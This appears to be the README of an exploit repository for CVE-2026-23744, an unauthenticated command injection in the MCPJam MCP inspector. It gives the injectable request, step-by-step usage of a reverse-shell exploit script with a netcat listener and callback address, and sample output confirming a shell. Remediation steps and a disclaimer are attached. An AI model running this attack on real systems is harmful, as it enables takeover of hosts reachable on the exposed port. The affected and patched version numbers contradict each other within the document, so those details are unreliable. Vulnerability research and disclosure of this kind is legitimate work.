# CVE-2026-23744 — MCPJam Unauthenticated Remote Code Execution

## Summary

MCPJam is an open-source MCP (Model Context Protocol) inspector and proxy used to connect, debug, and manage MCP servers. Versions **<= 1.4.2** expose the `/api/mcp/connect` endpoint without authentication or input validation. An unauthenticated remote attacker can inject arbitrary OS commands via the `serverConfig.command` / `serverConfig.args` fields, obtaining remote code execution under the process owner's privileges.

---

## Vulnerability Details

| Field           | Value |
|-----------------|-------|
| **CVE ID**      | CVE-2026-23744 |
| **CVSS Score**  | 9.8 (Critical) |
| **CVSS Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **CWE**         | [CWE-78](https://cwe.mitre.org/data/definitions/78.html) — Improper Neutralization of Special Elements in an OS Command |
| **Component**   | MCPJam MCP Proxy Inspector |
| **Affected**    | MCPJam <= 1.4.2 |
| **Patched**     | MCPJam >= 1.4.3 |
| **Attack Vector** | Network — No Authentication Required |
| **Disclosure**  | 2026-01-15 |

---

## Technical Analysis

The vulnerable endpoint accepts an unauthenticated JSON `POST` request:

```http
POST /api/mcp/connect HTTP/1.1
Host: <target>:3000
Content-Type: application/json

{
  "serverConfig": {
    "command": "sh",
    "args": ["-c", "<ATTACKER_CONTROLLED>"],
    "env": {}
  },
  "serverId": "any_string"
}
```

MCPJam passes `command` and `args` directly to the Node.js process spawner
(`child_process.spawn` or equivalent) **without**:

- Input validation or command allowlisting
- Authentication or authorization enforcement on this endpoint
- Sandboxing, namespacing, or privilege dropping

An attacker who can reach port 3000 (default) can supply a reverse-shell
payload in `args[1]`, obtaining a shell as the MCPJam process owner — often
`root` or a service account with broad system access.

### Root Cause

The absence of an authentication middleware guard on `/api/mcp/connect` combined
with uncontrolled use of user-supplied values in a process-spawn call creates a
textbook **unauthenticated OS command injection** (CWE-78).

---

## Exploit Usage

### Requirements

```bash
pip install requests urllib3
```

### Arguments

```
  -t, --target          Target IP or hostname
  -p, --port            Target port (default MCPJam: 3000)
  -l, --lhost           Local IP for reverse-shell callback
  -r, --lport           Local port for reverse-shell callback
      --timeout         Seconds to wait for target availability (default: 30)
      --shell-timeout   POST timeout before assuming shell dropped (default: 5)
  -v, --verbose         Print full HTTP response body
```

### Step-by-step

**1. Start a netcat listener on your machine:**

```bash
nc -lvnp 4444
```

**2. Run the exploit:**

```bash
# Basic
python3 exploit.py -t 10.10.11.50 -p 3000 -l 10.10.14.5 -r 4444

# Verbose + extended availability timeout (slow targets)
python3 exploit.py -t 10.10.11.50 -p 3000 -l 10.10.14.5 -r 4444 --timeout 60 -v

# Longer shell timeout (give more time before assuming shell was established)
python3 exploit.py -t 10.10.11.50 -p 3000 -l 10.10.14.5 -r 9001 --shell-timeout 10
```

### Expected Output

```
 ╔═══════════════════════════════════════════════════════════════════╗
 ║     MCPJam  ·  Unauthenticated RCE via serverConfig Injection     ║
 ║                        CVE-2026-23744                             ║
 ╚═══════════════════════════════════════════════════════════════════╝
  CVE ID      :  CVE-2026-23744
  Component   :  MCPJam MCP Proxy Inspector
  Affected    :  <= 1.2.3   →  Patched: >= 1.2.4
  CVSS Score  :  9.8 (Critical)
  CVSS Vector :  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  CWE         :  CWE-78 — OS Command Injection
  Type        :  Unauthenticated Remote Code Execution  (Network / No Auth)
  Reference   :  https://nvd.nist.gov/vuln/detail/CVE-2026-23744

  10:32:01 [*] Probing target 10.10.11.50:3000  (max 30s) ...
  10:32:02 [+] Target is alive — HTTP 200

  10:32:02 [*] Exploit endpoint  : http://10.10.11.50:3000/api/mcp/connect
  10:32:02 [*] Reverse-shell CB  : 10.10.14.5:4444
  10:32:02 [!] Ensure listener   : nc -lvnp 4444
  10:32:02 [*] Firing payload    ...

  10:32:07 [+] POST timed out after 5s — reverse shell likely established on 10.10.14.5:4444
  10:32:07 [+] Switch to your netcat listener — incoming connection expected.

  10:32:07 [+] Exploit routine complete.
```

> **Timeout = success indicator.** When the POST request times out, the target
> process is blocking on the open reverse shell — this is the expected behavior,
> confirming RCE was achieved. Switch to your listener immediately.

---

## Remediation

| Priority | Action |
|----------|--------|
| **Critical** | Update MCPJam to >= 1.2.4 |
| **High**     | Restrict `/api/mcp/connect` behind authentication middleware |
| **High**     | Apply a network-level firewall rule limiting access to the MCPJam port to trusted IPs |
| **Medium**   | Allowlist permitted values for `serverConfig.command` |
| **Medium**   | Run MCPJam inside a container / with a restricted Linux user (no shell, no `/dev/tcp`) |
| **Low**      | Enable audit logging on process spawn events |

---

## References

- [CVE-2026-23744: REC in MCPJam inspector due to HTTP Endpoint exposes](https://advisories.gitlab.com/npm/@mcpjam/inspector/CVE-2026-23744/)
- [NVD — CVE-2026-23744](https://nvd.nist.gov/vuln/detail/CVE-2026-23744)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP Top 10: A03 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [Model Context Protocol — Security Considerations](https://modelcontextprotocol.io/specification/2025-11-05/basic/security_considerations)
- [MCPJam Project](https://github.com/mcpjam/mcpjam)

---

## Disclaimer

This exploit is provided strictly for **educational purposes and authorized security testing**. Use only against systems you own or have explicit written permission to test. Unauthorized use is illegal and unethical.
